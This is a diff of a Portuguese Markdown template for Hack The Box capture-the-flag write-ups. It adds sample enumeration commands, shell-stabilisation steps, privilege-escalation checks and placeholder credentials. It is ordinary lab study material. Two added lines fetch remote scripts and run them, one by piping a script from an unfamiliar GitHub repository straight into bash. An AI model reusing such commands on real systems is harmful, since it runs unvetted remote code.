@@ -1,169 +1,193 @@
-# Nome da Máquina - HTB
+# 🏴️ NOME_DA_MAQUINA
 
-## :material-information: Informações Gerais
-
-| Campo | Valor |
-|:------|:------|
-| **Nome** | |
-| **IP** | |
-| **SO** | Linux / Windows |
-| **Dificuldade** | Easy / Medium / Hard / Insane |
-| **Data** | |
-| **Status** | :material-checkbox-marked-circle: Concluída / :material-progress-clock: Em Andamento |
-| **Objetivo** | |
-
-## :material-target: Escopo da Análise
-
-| Campo | Valor |
-|:------|:------|
-| **Tipo** | Active / Retired |
-| **Ambiente** | |
-| **Tags** | |
-| **Credenciais** | |
+> **Dificuldade:** :material-progress-clock: Easy | **SO:** Linux | **Release:** Active/Retired
 
 ---
 
-## :material-magnify: Enumeração Inicial
+## 📋 Informações Gerais
 
-### Portas e Serviços
+| Campo | Valor |
+|:------|:------|
+| **Nome** | Nome da Máquina |
+| **IP** | 10.10.10.10 |
+| **SO** | Linux |
+| **Dificuldade** | Easy / Medium / Hard |
+| **Data** | DD/MM/YYYY |
+| **Release** | Active / Retired |
+
+---
+
+## 🔍 Enumeração Inicial
+
+### Portas Abertas
 
 | Porta | Serviço | Versão |
 |:------|:--------|:-------|
-| 22 | ssh | OpenSSH |
-| 80 | http | Apache/Nginx |
+| 22 | ssh | OpenSSH x.x |
+| 80 | http | Apache x.x |
 
-### Comandos de Enumeração
+### Comandos
 
 ```bash
 # Scan rápido
-nmap -sV -p- <IP>
+nmap -sV -p- -T4 10.10.10.10
 
-# Scan completo
-nmap -sVC -p- <IP>
+# Scan completo com scripts
+nmap -sVC -p- 10.10.10.10
 
-# Web enumeration
-gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
-ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/ffuf/common.txt
+# Enumeração web
+gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 20
+ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/ffuf/common.txt
 ```
+
+### Descobertas Iniciais
+
+- [ ] Descoberta 1
+- [ ] Descoberta 2
 
 ---
 
-## :material-rocket: Exploração Inicial
+## 🚀 Exploração
 
-### Vetor Escolhido
+### Vetor de Entrada
 
 | Campo | Valor |
 |:------|:------|
-| **Vetor** | web / ssh / etc |
-| **Falha** | |
-| **Ferramentas** | |
+| **Vetor** | Web |
+| **Falha** | Descrição da vulnerabilidade |
+| **Ferramentas** | curl, burp, etc |
 
-### Acesso Inicial
+### Processo
 
-| Campo | Valor |
-|:------|:------|
-| **Usuário** | |
-| **Shell** | |
-
-```bash
-# Comandos de exploração
+```
+1. Primeira etapa...
+2. Segunda etapa...
+3. Terceira etapa...
 ```
 
----
-
-## :material-console: Shell e Estabilização
+### Código/Comandos
 
 ```bash
-# Estabilização de shell
-python3 -c "import pty; pty.spawn('/bin/bash')"
-export TERM=xterm
-
-# Reverse shell
-nc -lvnp <PORTA>
-```
-
----
-
-## :material-account-search: Enumeração Pós-Exploração
-
-### Usuários Encontrados
-
-| Usuário | Caminho / Info |
-|:--------|:---------------|
-| | |
-
-### Credenciais
-
-| Tipo | Valor |
-|:-----|:------|
-| Hashes | |
-| Senhas | |
-
-```bash
-# Enumeração
-linpeas.sh
-enum Linux
-```
-
----
-
-## :material-shield-arrow-up: Escalonamento de Privilégios
-
-### Vetores Identificados
-
-- [ ] Vetor 1
-- [ ] Vetor 2
-
-### Técnica Utilizada
-
-```bash
-# Comando de privilege escalation
+# Comando executado
+curl http://10.10.10.10/endpoint
 ```
 
 ### Resultado
 
 | Campo | Valor |
 |:------|:------|
-| **Acesso** | root / administrator |
-| **Data** | |
+| **Usuário** | www-data |
+| **Shell** | reverse shell com nc |
 
 ---
 
-## :material-flag: Flags
+## 🐚 Shell Inicial
 
-|:material-flag-outline: User| :material-flag: Root|
-|:---------------------------|:--------------------|
-| | |
+### Estabilização
+
+```bash
+# Método 1: python
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+# Método 2: socat
+socat file:`tty`,raw,echo=0 tcp:LISTENER
+
+# Método 3: upgrade com script
+curl -s https://raw.githubusercontent.com/rupping/invoke-katbin/main/bin/katbin.sh | bash
+```
 
 ---
 
-## :material-camera: Evidências
+## 📁 Enumeração Pós-Exploração
 
-![Evidência](../img/nome-maquina/evidencia.png)
+### Usuários do Sistema
+
+| Usuário | Shell | Home |
+|:--------|:------|:-----|
+| root | /bin/bash | /root |
+| user | /bin/bash | /home/user |
+
+### Credenciais Encontradas
+
+| Tipo | Valor |
+|:-----|:------|
+| Senha | password123 |
+| Hash | $1$xxxxx |
+
+### Arquivos Interessantes
+
+```bash
+# Busca por arquivos com permissões especiais
+find / -perm -4000 2>/dev/null
+
+# Busca por credenciais
+grep -r "password" /var/www 2>/dev/null
+```
 
 ---
 
-## :material-book-open-variant: Resumo Técnico
+## ⬆️ Escalação de Privilégios
+
+### Vetores Identificados
+
+- [ ] Cron jobs executando como root
+- [ ] Binários SUID
+- [ ] Permissões sudo mal configuradas
+
+### Exploração
+
+```bash
+# Verificar permissões sudo
+sudo -l
+
+# Enumeração automática
+wget https://raw.githubusercontent.com/peassng/linpeas/master/linpeas.sh
+./linpeas.sh
+```
+
+### Resultado
 
 | Campo | Valor |
 |:------|:------|
-| **Causa Raiz** | |
-| **Cadeia de Ataque** | 1. → 2. → 3. |
-| **Pontos de Atenção** | |
+| **Acesso** | root |
+| **Método** | Exploração de cron job |
+| **Data** | DD/MM/YYYY |
 
 ---
 
-## :material-lightbulb: Lições Aprendidas
+## 🚩 Flags
 
-- **O que funcionou:**
-- **O que atrasou:**
-- **Comandos para revisar:**
-- **Técnicas para estudar:**
+| :material-flag-outline: User | :material-flag: Root |
+|:-----------------------------|:---------------------|
+| `flag{user_flag_here}` | `flag{root_flag_here}` |
 
 ---
 
-## :material-chevron-double-right: Próximos Passos
+## 📸 Evidências
 
-- [ ] Revisar documentação
-- [ ] Estudar técnica utilizada
-- [ ] Praticar em máquinas similares
+![Evidência 1](../img/nome-maquina/scan.png)
+
+---
+
+## 📖 Resumo Técnico
+
+| Campo | Valor |
+|:------|:------|
+| **Causa Raiz** | Descrição da vulnerabilidade principal |
+| **Cadeia de Ataque** | Enumeração → Shell inicial → Privesc |
+| **Tempo Total** | ~45 minutos |
+
+---
+
+## 💡 Lições Aprendidas
+
+- **O que funcionou:** técnica X funcionou bem
+- **O que atrasou:** ponto que causou dificuldade
+- **Pontos de Atenção:** lições importantes
+
+---
+
+## 🔗 Referências
+
+- [Link 1](https://link.com)
+- [Link 2](https://link.com)
